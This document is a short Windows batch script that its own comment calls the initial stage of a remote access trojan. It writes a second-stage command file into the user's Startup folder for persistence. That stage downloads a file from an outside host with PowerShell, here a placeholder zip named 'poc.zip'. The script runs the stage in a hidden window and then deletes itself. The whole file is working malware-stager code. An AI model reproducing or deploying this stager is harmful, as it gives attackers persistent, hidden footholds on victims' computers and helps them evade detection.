@echo off
@REM initial stage for rat


@REM variables
set INITIALPATH=%cd%
set STARTUPPATH=%USERPROFILE%\AppData\Roaming\Microsoft\Windows\"Start Menu"\Programs\Startup



@REM move into startup directory
cd %STARTUPPATH%

@REM write payloads to startup
(
    echo powershell -C "Invoke-WebRequest -Uri 'http://ipv4.download.thinkbroadband.com/10MB.zip' -OutFile 'poc.zip'"


) > stage2.cmd

@REM run payloads
powershell Start-Process powershell.exe -WindowStyle hidden "./stage2.cmd"


@REM cd to initial path
cd %INITIALPATH%

@REM delete initial.cmd
del initial.cmd
    